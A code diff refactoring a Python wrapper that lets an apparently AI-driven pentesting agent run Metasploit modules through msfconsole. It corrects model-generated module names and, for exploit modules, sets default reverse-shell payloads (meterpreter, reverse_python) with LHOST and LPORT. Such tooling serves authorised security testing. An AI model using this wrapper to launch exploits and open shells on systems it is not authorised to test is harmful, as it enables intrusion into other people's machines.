@@ -2,10 +2,11 @@
 """
 """
 
-import re
 import logging
-import subprocess
+import re
 import shutil
+import subprocess
+from typing import Optional
 
 # Load config
 try:
@@ -55,10 +56,10 @@ def _setdefault_option_ci(opts: dict, key: str, value: str) -> None:
     opts[key] = value
 
 
-def run_msf_module(module: str, options_str: str, timeout: int = None, mode: str = "run") -> str:
+def run_msf_module(module: str, options_str: str, timeout: Optional[int] = None, mode: str = "run") -> str:
     """
     Runs msfconsole with a specific module and options.
-    v3.0: Robust option parsing, handles various AI output formats.
+    Handles multiple model-generated option formats.
     
     Args:
         module: MSF module path, e.g. "exploit/unix/ftp/vsftpd_234_backdoor"
@@ -77,7 +78,7 @@ def run_msf_module(module: str, options_str: str, timeout: int = None, mode: str
     # Clean module name (remove leading/trailing whitespace, quotes)
     module = module.strip().strip('"').strip("'")
 
-    # v7.0: Comprehensive module correction map — 50+ AI hallucination fixes
+    # Correct common model-generated aliases to valid Metasploit modules.
     _MODULE_CORRECTIONS = {
         # ── SSH ──────────────────────────────────────────────────────
         "exploit/unix/ssh/ssh_login":       "auxiliary/scanner/ssh/ssh_login",
@@ -191,20 +192,19 @@ def run_msf_module(module: str, options_str: str, timeout: int = None, mode: str
         script += f"set {k} {v}; "
     
     # Auto-set payload for exploit modules
-    if module.startswith("exploit/"):
-        if not opts.get("PAYLOAD"):
-            # Default payloads by platform
-            if "unix" in module or "linux" in module:
-                script += "set PAYLOAD cmd/unix/reverse_python; "
-            elif "windows" in module:
-                script += "set PAYLOAD windows/meterpreter/reverse_tcp; "
-            else:
-                script += "set PAYLOAD generic/shell_reverse_tcp; "
-            # Set LHOST if not specified
-            if not opts.get("LHOST"):
-                script += "set LHOST 0.0.0.0; "
-            if not opts.get("LPORT"):
-                script += "set LPORT 4444; "
+    if module.startswith("exploit/") and not opts.get("PAYLOAD"):
+        # Default payloads by platform
+        if "unix" in module or "linux" in module:
+            script += "set PAYLOAD cmd/unix/reverse_python; "
+        elif "windows" in module:
+            script += "set PAYLOAD windows/meterpreter/reverse_tcp; "
+        else:
+            script += "set PAYLOAD generic/shell_reverse_tcp; "
+        # Set LHOST if not specified
+        if not opts.get("LHOST"):
+            script += "set LHOST 0.0.0.0; "
+        if not opts.get("LPORT"):
+            script += "set LPORT 4444; "
     
     # Use 'run' instead of 'exploit' for auxiliary modules. In check mode,
     # exploit modules use Metasploit's check action when available.
@@ -220,16 +220,14 @@ def run_msf_module(module: str, options_str: str, timeout: int = None, mode: str
     print(f"  [*] MSF Script: {script}")
 
     try:
-        import time, threading
+        import threading
+        import time
 
         lines = []
         login_success_seen = [False]
         start = time.time()
         # Reduce timeout for auxiliary (scan) modules — they shouldn't take long
-        if module.startswith("auxiliary/") or mode == "check":
-            msf_timeout = min(timeout, 60)
-        else:
-            msf_timeout = min(timeout, 120)
+        msf_timeout = min(timeout, 60) if module.startswith("auxiliary/") or mode == "check" else min(timeout, 120)
 
         proc = subprocess.Popen(
             ["msfconsole", "-q", "-n", "-x", script],
@@ -307,9 +305,13 @@ def run_msf_module(module: str, options_str: str, timeout: int = None, mode: str
                 logging.debug(f"Suppressed in msf.py: {_exc}")
 
         # Filter MSF noise
-        filtered = [l for l in lines
-                     if l.strip() and not l.startswith("[*] Starting ")
-                     and "msf" not in l.lower()[:10]]
+        filtered = [
+            line
+            for line in lines
+            if line.strip()
+            and not line.startswith("[*] Starting ")
+            and "msf" not in line.lower()[:10]
+        ]
         out = "\n".join(filtered)
 
         # Detect errors early
